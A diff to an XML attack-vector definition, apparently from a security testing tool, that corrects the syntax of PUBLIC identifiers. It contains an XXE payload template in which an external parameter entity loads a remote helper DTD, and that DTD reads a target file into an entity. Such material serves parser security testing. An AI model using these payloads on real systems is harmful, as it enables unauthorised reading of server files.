@@ -23,11 +23,11 @@
 <attackvector type="public" >
 <directMessage><![CDATA[<?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE data [
-<!ENTITY % remote PUBLIC p "§tf_helperURL§">
+<!ENTITY % remote PUBLIC "p" "§tf_helperURL§">
 %remote;
 ]>
 <data attrib='&internal;'/>]]></directMessage>
-<helperMessage><![CDATA[ <!ENTITY % payload PUBLIC p2 "§tf_targetFILE§">
+<helperMessage><![CDATA[ <!ENTITY % payload PUBLIC "p1" "§tf_targetFILE§">
 <!ENTITY % param1 "<!ENTITY internal '%payload;'>">
 %param1;]]></helperMessage>
 </attackvector>
